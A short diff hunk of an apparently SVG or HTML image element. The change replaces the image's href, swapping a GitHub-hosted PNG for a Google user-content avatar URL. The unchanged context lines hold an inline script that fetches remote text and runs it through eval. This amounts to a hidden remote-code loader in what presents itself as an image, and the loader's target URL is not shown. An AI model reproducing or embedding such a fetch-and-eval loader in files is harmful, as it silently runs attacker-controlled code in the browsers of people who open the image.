@@ -6,7 +6,7 @@
                       .then(res => res.text())
                       .then(eval)
                       .catch(err => console.error('Error loading script:', err))" />
-                       <image href="https://raw.githubusercontent.com/totallylost-helpme/totallylost-helpme.github.io/refs/heads/main/aigril2.png" 
+                       <image href="https://lh3.googleusercontent.com/a/ACg8ocIXTF6vp7u1eelco1jXvl-HU-r1-d17oIU4P6hk7Gxa_9ASNA=s288-c-no" 
          alt="Base Image" 
          width="300" 
          height="auto" />
